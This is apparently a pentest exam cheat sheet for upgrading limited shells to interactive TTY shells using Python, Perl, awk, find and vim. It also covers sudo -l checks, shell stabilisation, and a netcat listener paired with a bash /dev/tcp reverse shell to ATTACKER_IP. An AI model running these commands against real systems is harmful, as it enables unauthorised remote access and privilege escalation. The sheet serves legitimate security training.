## 🖥️ Limited Shell vs Interactive Shell

![Image](https://itsfoss.com/content/images/wordpress/2021/11/ubuntu-terminal-tty-command.png)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://docs.rapid7.com/images/metasploit/m_shell_commands.png)

![Image](https://docs.rapid7.com/images/metasploit/meterpreter_pro.png)

### 🔒 Limited Shell (Jail Shell)

A limited shell has restrictions:

- No prompt or limited prompt
    
- No job control
    
- Cannot use many commands (`su`, `sudo`, `nano`, etc.)
    
- Cannot escalate privileges easily
    
- No tab completion
    
- No proper terminal interaction
    

Example limited shell:

```bash
sh-4.2$
```

---

### ✅ Interactive Shell (TTY Shell)

Provides:

- Full terminal access
    
- Command history
    
- Job control
    
- Proper prompt
    
- Ability to use sudo, su, ssh, nano, vim, etc.
    

Example interactive shell:

```bash
user@target:~$
```

---

# ⚙️ Method 1: Using /bin/sh Interactive Mode

```bash
/bin/sh -i
```

### Explanation:

|Part|Meaning|
|---|---|
|/bin/sh|Bourne shell interpreter|
|-i|Interactive mode|

Output example:

```bash
sh: no job control in this shell
sh-4.2$
```

---

# 🐍 Method 2: Python Interactive Shell (Most Common)

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

### Explanation:

|Part|Meaning|
|---|---|
|python|Execute Python|
|import pty|Import pseudo terminal module|
|pty.spawn|Spawn interactive terminal|
|/bin/sh|Shell interpreter|

Result:

```bash
sh-4.2$
```

---

# 🐪 Method 3: Perl Shell

```bash
perl -e 'exec "/bin/sh";'
```

### Explanation:

|Part|Meaning|
|---|---|
|perl|Execute Perl|
|exec|Execute command|
|/bin/sh|Launch shell|

---

# 💎 Method 4: Ruby Shell

```bash
ruby -e 'exec "/bin/sh"'
```

Explanation:

Ruby executes shell interpreter directly.

---

# 🌙 Method 5: Lua Shell

```bash
lua -e 'os.execute("/bin/sh")'
```

Explanation:

Lua executes shell using os.execute function.

---

# 📊 Method 6: AWK Shell

```bash
awk 'BEGIN {system("/bin/sh")}'
```

Explanation:

|Part|Meaning|
|---|---|
|BEGIN|Execute immediately|
|system()|Execute system command|
|/bin/sh|Launch shell|

---

# 🔎 Method 7: Find Command Shell

### Method 1:

```bash
find . -exec /bin/sh \; -quit
```

Explanation:

|Part|Meaning|
|---|---|
|find .|Search current directory|
|-exec|Execute command|
|/bin/sh|Start shell|
|-quit|Exit find|

---

### Method 2:

```bash
find / -name test -exec /bin/sh \;
```

---

# 📝 Method 8: Vim Shell Escape

## Method 1:

```bash
vim -c ':!/bin/sh'
```

## Method 2:

```bash
vim
:set shell=/bin/sh
:shell
```

Explanation:

Vim allows shell escape to system shell.

---

# 🔐 Execution Permissions Check

```bash
ls -la /path/to/file
```

Example output:

```bash
-rwxr-xr-x 1 root root 1234 file
```

Explanation:

|Permission|Meaning|
|---|---|
|r|Read|
|w|Write|
|x|Execute|

---

# 🔑 Check Sudo Permissions

```bash
sudo -l
```

Example:

```bash
User apache may run the following commands:
(ALL : ALL) NOPASSWD: ALL
```

Meaning:

User can run ANY command as root.

This = Full privilege escalation.

---

# 🧠 Shell Interpreter Locations

|Shell|Location|
|---|---|
|sh|/bin/sh|
|bash|/bin/bash|
|zsh|/bin/zsh|
|dash|/bin/dash|

---

# 🎯 How to Identify Current Shell

```bash
echo $0
```

Example output:

```bash
sh
```

---

# ⚠️ Why Interactive Shell is Important

Without interactive shell:

❌ sudo may not work  
❌ su may not work  
❌ nano/vim may not work  
❌ privilege escalation difficult

With interactive shell:

✅ Full control  
✅ Privilege escalation possible  
✅ Stable connection

---

# 🔥 Best Method Priority Order (Exam / HTB)

|Priority|Method|
|---|---|
|1|python pty.spawn|
|2|/bin/bash -i|
|3|find -exec|
|4|awk|
|5|perl|
|6|ruby|
|7|lua|
|8|vim|

---

# 🧪 Real Pentest Example Workflow

Step 1: Get shell

```bash
nc -lvnp 4444
```

Step 2: Upgrade shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Step 3: Check sudo

```bash
sudo -l
```

Step 4: Privilege escalation

---

# 🧾 Key Exam Tips (VERY IMPORTANT)

Always try first:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
sudo -l
```

Then:

```bash
whoami
```

---

# 🐧 Spawning Interactive Shells — Cheat Sheet (Table Format)

---

## 🧠 Basic Interactive Shell Commands

|Method|Command|Requirement|Notes|
|---|---|---|---|
|SH Interactive|`/bin/sh -i`|sh present|Basic interactive shell|
|Bash Interactive|`/bin/bash -i`|bash present|Better than sh|
|Python TTY|`python -c 'import pty; pty.spawn("/bin/bash")'`|Python installed|⭐ BEST METHOD|
|Python sh|`python -c 'import pty; pty.spawn("/bin/sh")'`|Python installed|Alternative|

---

## 🐍 Python Shell Upgrade (Recommended)

|Command|Purpose|
|---|---|
|`which python`|Check if Python exists|
|`python -c 'import pty; pty.spawn("/bin/bash")'`|Spawn bash TTY|
|`python3 -c 'import pty; pty.spawn("/bin/bash")'`|Use python3|

---

## 🐪 Perl Shell

|Command|Requirement|Notes|
|---|---|---|
|`perl -e 'exec "/bin/sh";'`|Perl installed|Spawns shell|
|`perl -e 'exec "/bin/bash";'`|Perl installed|Bash shell|

---

## 💎 Ruby Shell

|Command|Requirement|Notes|
|---|---|---|
|`ruby -e 'exec "/bin/sh"'`|Ruby installed|Basic shell|
|`ruby -e 'exec "/bin/bash"'`|Ruby installed|Bash shell|

---

## 🌙 Lua Shell

|Command|Requirement|Notes|
|---|---|---|
|`lua -e 'os.execute("/bin/sh")'`|Lua installed|Execute shell|

---

## 📊 AWK Shell

|Command|Requirement|Notes|
|---|---|---|
|`awk 'BEGIN {system("/bin/sh")}'`|awk installed|Common in Linux|
|`awk 'BEGIN {system("/bin/bash")}'`|awk installed|Bash shell|

---

## 🔎 Find Command Shell

|Command|Requirement|Notes|
|---|---|---|
|`find . -exec /bin/sh \; -quit`|find installed|Reliable method|
|`find / -exec /bin/bash \;`|find installed|Bash shell|

---

## 📝 Vim Shell Escape

|Command|Requirement|Notes|
|---|---|---|
|`vim -c ':!/bin/sh'`|vim installed|Quick escape|
|`vim` → `:set shell=/bin/sh` → `:shell`|vim installed|Full shell|

---

## ⚙️ Check Shell Type

|Command|Purpose|
|---|---|
|`echo $0`|Show current shell|
|`whoami`|Show current user|
|`id`|Show user privileges|

---

## 🔐 Check Permissions

|Command|Purpose|
|---|---|
|`ls -la`|Check file permissions|
|`sudo -l`|Check sudo privileges|

---

## 🔥 Stabilize Shell (VERY IMPORTANT)

After getting shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then run:

```bash
export TERM=xterm
```

Press:

```
CTRL + Z
```

Then on attacker machine:

```bash
stty raw -echo
fg
```

---

## 🎯 Shell Upgrade Priority Order

|Priority|Method|
|---|---|
|⭐ 1|python pty.spawn|
|2|/bin/bash -i|
|3|find -exec|
|4|awk|
|5|perl|
|6|ruby|
|7|lua|
|8|vim|

---

## 🧪 Full Real Example

**Listener:**

```bash
nc -lvnp 4444
```

**Victim:**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Upgrade shell:**

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🧾 Quick Detection Commands

|Command|Purpose|
|---|---|
|`which python`|Check python|
|`which perl`|Check perl|
|`which ruby`|Check ruby|
|`which lua`|Check lua|
|`which bash`|Check bash|

---

## 🏆 Most Important Commands (Remember These)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
/bin/bash -i
```

```bash
find . -exec /bin/bash \; -quit
```

```bash
sudo -l
```

